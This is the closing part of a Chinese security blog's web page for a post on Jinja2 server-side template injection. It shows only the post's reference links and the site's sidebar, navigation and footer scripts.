<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="https://docs.python.org/zh-cn/2.7/reference/datamodel.html?highlight=__enter__#object.__enter__" target="_blank" rel="noopener">https://docs.python.org/zh-cn/2.7/reference/datamodel.html?highlight=__enter__#object.__enter__</a></p>
<p><a href="https://drops.org.cn/Python/flask-jinja2-ssti.html#directory04395356149972733410" target="_blank" rel="noopener">https://drops.org.cn/Python/flask-jinja2-ssti.html#directory04395356149972733410</a></p>
<p>[<a href="https://evi0s.com/2018/11/26/%E6%B7%B1%E5%85%A5ssti-%E4%BB%8Enctf2018%E4%B8%A4%E9%81%93flask%E7%9C%8Bbypass%E6%96%B0%E5%A7%BF%E5%8A%BF/]" target="_blank" rel="noopener">https://evi0s.com/2018/11/26/%E6%B7%B1%E5%85%A5ssti-%E4%BB%8Enctf2018%E4%B8%A4%E9%81%93flask%E7%9C%8Bbypass%E6%96%B0%E5%A7%BF%E5%8A%BF/]</a>(</p>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://yoursite.com/2019/07/07/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-Jinja2/" data-id="ckabsu38j001ykkvr2mk875vn" class="article-share-link" data-share="baidu" data-title="SSTI模板注入-Jinja2">Share</a>
      

      
        <a href="http://yoursite.com/2019/07/07/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-Jinja2/#ds-thread" class="article-comment-link">Comments</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a></li></ul>

    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2019/07/09/php-session%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E4%BA%A7%E7%94%9F%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          php-session配置不当产生的安全问题
        
      </div>
    </a>
  
  
    <a href="/2019/07/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">Python沙箱逃逸</div>
    </a>
  
</nav>

  
</article>


  <section id="comments">
    <div id="ds-thread" class="ds-thread" data-thread-key="2019/07/07/SSTI模板注入-Jinja2/" data-title="SSTI模板注入-Jinja2" data-url="http://yoursite.com/2019/07/07/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-Jinja2/"></div>
  </section>
</section>
      
      <aside id="sidebar">
  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a><span class="tag-list-count">30</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Crypto/" rel="tag">Crypto</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/WEB%E5%AE%89%E5%85%A8/" rel="tag">WEB安全</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/" rel="tag">Web</a><span class="tag-list-count">7</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a><span class="tag-list-count">26</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSS/" rel="tag">XSS</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/" rel="tag">xss</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%94%9F%E6%B4%BB%E9%9A%8F%E7%AC%94/" rel="tag">生活随笔</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9A%8F%E7%AC%94/" rel="tag">随笔</a><span class="tag-list-count">1</span></li></ul>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/Crypto/" style="font-size: 12.5px;">Crypto</a> <a href="/tags/WEB%E5%AE%89%E5%85%A8/" style="font-size: 10px;">WEB安全</a> <a href="/tags/Web/" style="font-size: 15px;">Web</a> <a href="/tags/Web%E5%AE%89%E5%85%A8/" style="font-size: 17.5px;">Web安全</a> <a href="/tags/XSS/" style="font-size: 10px;">XSS</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/%E7%94%9F%E6%B4%BB%E9%9A%8F%E7%AC%94/" style="font-size: 10px;">生活随笔</a> <a href="/tags/%E9%9A%8F%E7%AC%94/" style="font-size: 10px;">随笔</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a><span class="archive-list-count">21</span></li></ul>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2020/05/13/Apache-Common-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/">Apache Common Collections 反序列化分析学习</a>
          </li>
        
          <li>
            <a href="/2020/05/12/intigriti-Easter-XSS-challenge/">intigriti Easter XSS challenge</a>
          </li>
        
          <li>
            <a href="/2020/04/22/VolgaCTF-2020-Qualifier-Web/">VolgaCTF 2020 Qualifier-Web</a>
          </li>
        
          <li>
            <a href="/2020/04/15/DOM-Clobbering-Attack/">DOM Clobbering Attack</a>
          </li>
        
          <li>
            <a href="/2020/04/09/Javascript%E4%B8%AD%E5%8F%98%E9%87%8F%E5%A3%B0%E6%98%8E%E5%B8%A6%E6%9D%A5%E7%9A%84Tags-Broken/">Javascript中变量声明带来的Tags Broken</a>
          </li>
        
      </ul>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Links</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="http://arvinxiang.com" target="_blank">主题作者</a>
          </li>
        
          <li>
            <a href="http://reqianduan.com" target="_blank">热前端</a>
          </li>
        
          <li>
            <a href="http://yuancheng.work" target="_blank">远程.work</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
      
    </div>
    <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2020 离怀秋<br>
      Powered by <a href="//hexo.io/" target="_blank">Hexo</a>
      .
      Theme by <a href="https://github.com/xiangming/landscape-plus" target="_blank">Landscape-plus</a>
    </div>
  </div>
</footer>
  </div>
  <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
  <!-- totop start -->
<div id="totop">
<a title="totop"><img src="/img/scrollup.png"/></a>
</div>

<!-- totop end -->

<!-- 多说公共js代码 start -->
<script type="text/javascript">
var duoshuoQuery = {short_name:"reqianduan"};
  (function() {
    var ds = document.createElement('script');
    ds.type = 'text/javascript';ds.async = true;
    ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
    ds.charset = 'UTF-8';
    (document.getElementsByTagName('head')[0]
     || document.getElementsByTagName('body')[0]).appendChild(ds);
  })();
  </script>
<!-- 多说公共js代码 end -->


<!-- 百度分享 start -->

<div id="article-share-box" class="article-share-box">
  <div id="bdshare" class="bdsharebuttonbox article-share-links">
    <a class="article-share-weibo" data-cmd="tsina" title="分享到新浪微博"></a>
    <a class="article-share-weixin" data-cmd="weixin" title="分享到微信"></a>
    <a class="article-share-qq" data-cmd="sqq" title="分享到QQ"></a>
    <a class="article-share-renren" data-cmd="renren" title="分享到人人网"></a>
    <a class="article-share-more" data-cmd="more" title="更多"></a>
  </div>
</div>
<script>
  function SetShareData(cmd, config) {
    if (shareDataTitle && shareDataUrl) {
      config.bdText = shareDataTitle;
      config.bdUrl = shareDataUrl;
    }
    return config;
  }
  window._bd_share_config={
    "common":{onBeforeClick: SetShareData},
    "share":{"bdCustomStyle":"/css/bdshare.css"}
  };
  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='//bdimg.share.baidu.com/static/api/js/share.js?cdnversion='+~(-new Date()/36e5)];
</script>

<!-- 百度分享 end -->

<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>





<script src="/js/script.js"></script>


</div>
<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":200,"height":300},"mobile":{"show":false},"log":false});</script></body>
</html>
